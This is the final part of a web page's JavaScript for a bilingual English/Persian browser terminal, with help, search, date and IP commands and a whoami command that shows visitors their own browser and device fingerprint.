                await printToTerminal('Error: Could not retrieve information from the worker.', 'error', true);
            }
        }

        function typeEffect(text, element, speed) {
            return new Promise(resolve => {
                let i = 0;
                const interval = setInterval(() => {
                    if (i < text.length) {
                        element.innerHTML += text.charAt(i);
                        i++;
                        scrollToBottom();
                    } else {
                        clearInterval(interval);
                        resolve();
                    }
                }, speed);
            });
        }

        function scrollToBottom() {
            requestAnimationFrame(() => { output.scrollTop = output.scrollHeight; });
        }

        async function printToTerminal(text, type = 'output-line', useTyping = true) {
            const line = document.createElement('div');
            if (type) line.classList.add(...type.split(' '));
            output.appendChild(line);
            if (useTyping && !text.includes('<')) {
                await typeEffect(text, line, typingSpeed);
            } else {
                line.innerHTML = text;
            }
            scrollToBottom();
        }

        function printPrompt(command) {
             const line = document.createElement('div');
             line.innerHTML = `<span class="prompt">${promptEl.innerHTML}</span> ${command}`;
             output.appendChild(line);
        }

        function toggleInput(enable) {
            commandInput.disabled = !enable;
            if (enable) {
                commandInput.focus();
                cursor.style.display = 'inline-block';
            } else {
                commandInput.blur();
                cursor.style.display = 'none';
            }
        }

        async function executeCommand(command) {
            isTyping = true;
            toggleInput(false);
            printPrompt(command);

            if (command.trim() !== '') {
               commandHistory.unshift(command);
               historyIndex = -1;
            }

            const [cmd, ...args] = command.toLowerCase().split(' ').filter(Boolean);
            const helpTopics = ['linux', 'windows', 'asm', 'reversing', 'compare'];

            try {
                if (helpTopics.includes(cmd)) {
                    const contentEl = document.getElementById(`help-${cmd}`);
                    if (contentEl) await printToTerminal(contentEl.innerHTML, 'output-line', false);
                } else {
                    switch (command.toLowerCase().trim()) {
                        case 'help':
                        case 'راهنما':
                            await printToTerminal(document.getElementById('help-main').innerHTML, 'output-line', false);
                            break;
            case 'whoami':
            case 'من کی هستم':
                if (!fingerprintInstance) {
                    await printToTerminal('Error: Fingerprint script not loaded correctly.', 'error', true);
                    break;
                }
                await printToTerminal('Gathering advanced system fingerprint...', 'info', true);

                const browserInfo = fingerprintInstance.getBrowserInfo();
                const gpuInfo = fingerprintInstance.getGPUInfo();
                const suspicionInfo = fingerprintInstance.analyzeUserAgentSuspicion();
                const timezoneInfo = fingerprintInstance.getDetailedTimezoneInfo();

                let batteryInfo = 'N/A';
                if ('getBattery' in navigator) {
                    try {
                        const battery = await navigator.getBattery();
                        const chargingStatus = battery.charging ? 'Charging' : 'Discharging';
                        batteryInfo = `${Math.round(battery.level * 100)}% (${chargingStatus})`;
                    } catch (e) {
                        batteryInfo = 'Permission Denied';
                    }
                }

                const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
                const connectionType = connection ? connection.effectiveType : 'N/A';
                const downlink = connection ? `${connection.downlink} Mbps` : 'N/A';

                const pluginsList = (navigator.plugins && navigator.plugins.length > 0)
                    ? Array.from(navigator.plugins).map(p => p.name).join(', ')
                    : 'None';
                let info = `\n<b>--- Fingerprint & Suspicion ---</b>\n` +
                           `<b>Hashed Fingerprint:</b> ${fingerprintInstance.generateHashedFingerprint()}\n` +
                           `<b>Suspicion Level:</b> ${suspicionInfo.level} (${suspicionInfo.score})\n` +
                           `<b>Reasons:</b> ${suspicionInfo.reasons.join(', ')}\n\n` +

                           `<b>--- Browser & OS ---</b>\n` +
                           `<b>Browser:</b> ${browserInfo.browser} ${browserInfo.version}\n` +
                           `<b>Engine:</b> ${fingerprintInstance.getBrowserEngine()}\n` +
                           `<b>Vendor:</b> ${navigator.vendor || 'N/A'}\n` +
                           `<b>Operating System:</b> ${browserInfo.os}\n` +
                           `<b>Platform:</b> ${navigator.platform}\n` +
                           `<b>User Agent:</b> ${navigator.userAgent}\n` +
                           `<b>Installed Plugins:</b> ${pluginsList}\n\n`+

                           `<b>--- Hardware & Display ---</b>\n` +
                           `<b>Device Type:</b> ${fingerprintInstance.getDeviceType()}\n` +
                           `<b>Touch Points Supported:</b> ${navigator.maxTouchPoints || '0'}\n` +
                           `<b>CPU Architecture:</b> ${fingerprintInstance.getArchitecture()}\n` +
                           `<b>CPU Cores:</b> ${navigator.hardwareConcurrency || 'N/A'}\n` +
                           `<b>Memory (Approx.):</b> ${fingerprintInstance.getApproximateMemory()}\n` +
                           `<b>Battery Status:</b> ${batteryInfo}\n` +
                           `<b>Screen Resolution:</b> ${window.screen.width}x${window.screen.height}\n` +
                           `<b>Available Screen Size:</b> ${window.screen.availWidth}x${window.screen.availHeight}\n`+
                           `<b>Device Pixel Ratio:</b> ${window.devicePixelRatio || 'N/A'}\n`+
                           `<b>Color Depth:</b> ${window.screen.colorDepth}-bit\n` +
                           `<b>GPU Vendor:</b> ${gpuInfo.vendor}\n` +
                           `<b>GPU Renderer:</b> ${gpuInfo.renderer}\n\n` +

                           `<b>--- Privacy & Anonymity ---</b>\n` +
                           `<b>Cookies Enabled:</b> ${navigator.cookieEnabled ? 'Yes' : 'No'}\n` +
                           `<b>Do Not Track:</b> ${fingerprintInstance.getDNTStatus()}\n` +
                           `<b>Incognito Mode:</b> ${fingerprintInstance.isIncognitoMode() ? 'Likely Yes' : 'No'}\n` +
                           `<b>Canvas Fingerprint:</b> ${fingerprintInstance.getCanvasFingerprint()}\n\n` +

                           `<b>--- Regional & Network ---</b>\n` +
                           `<b>Languages:</b> ${(navigator.languages || []).join(', ')}\n` +
                           `<b>Timezone:</b> ${timezoneInfo['Timezone Name']}\n` +
                           `<b>Timezone Offset:</b> ${timezoneInfo['Timezone Offset']}\n`+
                           `<b>Connection Type:</b> ${connectionType}\n`+
                           `<b>Downlink Speed (Approx.):</b> ${downlink}\n`;             
                            await printToTerminal(info, 'info', false);
                            break;
                        case 'ip':
                        case 'آی پی':
                            await getIpInfoAdvanced();
                            break;
                        case 'date':
                        case 'زمان':
                            const now = new Date();
                            const formatted = now.toLocaleString(undefined, { year: 'numeric', month: 'long', day: '2-digit', weekday: 'long', hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: false });
                            await printToTerminal(`🕒 : ${formatted}`, 'info', false);
                            break;
                        case 'clear':
                        case 'پاک شود':
                            output.innerHTML = '';
                            break;
                        case '':
                            break;
                        default:
                            if (cmd === 'search') {
                                if (args.length === 0) {
                                    await printToTerminal("Usage: search <keyword>", 'error');
                                } else {
                                    const keyword = args.join(' ').toLowerCase();
                                    let resultsFound = false;
                                    const resultsOutput = [];
                                    const sectionsToSearch = ['help-linux', 'help-windows', 'help-asm', 'reversing'];
                                    await printToTerminal(`Searching for '${keyword}'...`, 'info', true);
                                    for (const sectionId of sectionsToSearch) {
                                        const sectionElement = document.getElementById(sectionId);
                                        if (!sectionElement) continue;
                                        const sectionTitle = sectionElement.querySelector('h3').textContent;
                                        const items = sectionElement.querySelectorAll('.command-item');
                                        const matchedItemsInSection = [];
                                        items.forEach(item => {
                                            if (item.textContent.toLowerCase().includes(keyword)) {
                                                matchedItemsInSection.push(item.outerHTML);
                                                resultsFound = true;
                                            }
                                        });
                                        if (matchedItemsInSection.length > 0) {
                                            resultsOutput.push(`<h3 style="color:var(--green); margin-top:10px;">--- Found in ${sectionTitle} ---</h3>` + matchedItemsInSection.join('<hr style="border-color: var(--comment);">'));
                                        }
                                    }
                                    if (resultsFound) await printToTerminal(resultsOutput.join(''), 'output-line', false);
                                    else await printToTerminal(`No results found for '${keyword}'.`, 'error', true);
                                }
                            } else {
                                await printToTerminal(`'${command}': command not found. Type 'help'.\nدستور شناسایی نشد. 'راهنما' را تایپ کنید.`, 'error', true);
                            }
                            break;
                    }
                }
            } catch (err) {
                await printToTerminal(`An unexpected error occurred: ${err.message}`, 'error', true);
            } finally {
                isTyping = false;
                toggleInput(true);
                scrollToBottom();
            }
        }

        async function initTerminal() {
            toggleInput(false);
            try {
                await printToTerminal('Initializing ...', 'info', true);
                await printToTerminal('Loading advanced command modules... [OK]', 'info', true);
                await printToTerminal('Welcome, خوش آمدید.', 'info', true);
                const asciiArt = document.getElementById('ascii-art').innerHTML;
                await printToTerminal(asciiArt, 'output-line', false);
                await printToTerminal(document.getElementById('help-main').innerHTML, 'output-line', false);
            } catch (err) {
                 await printToTerminal(`Initialization failed: ${err.message}`, 'error', true);
            } finally {
                isTyping = false;
                toggleInput(true);
            }
        }

        commandInput.addEventListener('keydown', (e) => {
            if (isTyping) { e.preventDefault(); return; }
            if (e.key === 'Enter') {
                e.preventDefault();
                const command = commandInput.value.trim();
                executeCommand(command);
                commandInput.value = '';
            } else if (e.key === 'ArrowUp') {
                e.preventDefault();
                if (historyIndex < commandHistory.length - 1) {
                    historyIndex++;
                    commandInput.value = commandHistory[historyIndex];
                }
            } else if (e.key === 'ArrowDown') {
                e.preventDefault();
                if (historyIndex > 0) {
                    historyIndex--;
                    commandInput.value = commandHistory[historyIndex];
                } else {
                    historyIndex = -1;
                    commandInput.value = '';
                }
            }
        });

        terminal.addEventListener('click', (e) => {
            if(e.target === terminal || e.target === output) {
                if (!commandInput.disabled) commandInput.focus();
            }
        });

        initTerminal();
    });
</script>
</body>
</html>
